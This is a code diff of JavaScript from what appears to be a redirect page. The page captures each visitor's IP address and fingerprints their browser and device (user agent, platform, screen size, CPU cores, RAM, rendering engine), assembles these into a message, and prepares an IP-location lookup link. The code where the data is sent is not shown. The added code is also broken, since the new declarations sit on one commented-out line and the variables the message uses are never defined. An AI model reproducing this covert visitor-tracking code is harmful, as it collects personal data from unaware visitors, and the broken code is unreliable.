@@ -73,26 +73,42 @@ redirectToNextURL();
     const data = await response.json();
     const ipAddress = data.ip;
 
-// Retrieve additional information about the user's operating system and browser
-  const userAgent = navigator.userAgent;
-  const platform = navigator.platform;
-  const language = navigator.language;
-  const screenWidth = window.screen.width;
-  const screenHeight = window.screen.height;
+// Retrieve additional information about the user's system and browser const userAgent = navigator.userAgent; const platform = navigator.platform; const language = navigator.language; const screenWidth = window.screen.width; const screenHeight = window.screen.height; const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property const vendor = navigator.vendor; const renderingEngine = getRenderingEngine(); 
 
 
 
-   // const message = `\nالايبي:\n \n${ipAddress}`;
-	
-const message = `
-    IP: ${ipAddress}\n
-    User Agent: ${userAgent}\n
-    Platform: ${platform}\n
-    Language: ${language}\n
-    Screen Width: ${screenWidth}\n
-    Screen Height: ${screenHeight}\n
+   const message = `
+    IP: ${ipAddress}
+    User Agent: ${userAgent}
+    Platform: ${platform}
+    Language: ${language}
+    Screen Width: ${screenWidth}
+    Screen Height: ${screenHeight}
+    CPU Cores: ${cpuCores}
+    Total RAM: ${totalRAM}
+    Vendor: ${vendor}
+    Rendering Engine: ${renderingEngine}
   `;
 
+
+function getRenderingEngine() {
+    const engine = 'Unknown';
+    const ua = navigator.userAgent.toLowerCase();
+
+    if (ua.includes('trident')) {
+      return 'Internet Explorer';
+    } else if (ua.includes('edge')) {
+      return 'Microsoft Edge';
+    } else if (ua.includes('gecko') && ua.includes('firefox')) {
+      return 'Mozilla Firefox';
+    } else if (ua.includes('webkit') && !ua.includes('chrome')) {
+      return 'Safari';
+    } else if (ua.includes('blink') && ua.includes('chrome')) {
+      return 'Google Chrome or Chromium';
+    }
+
+    return engine;
+  }
 
 	 // Create the message with clickable link
     const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
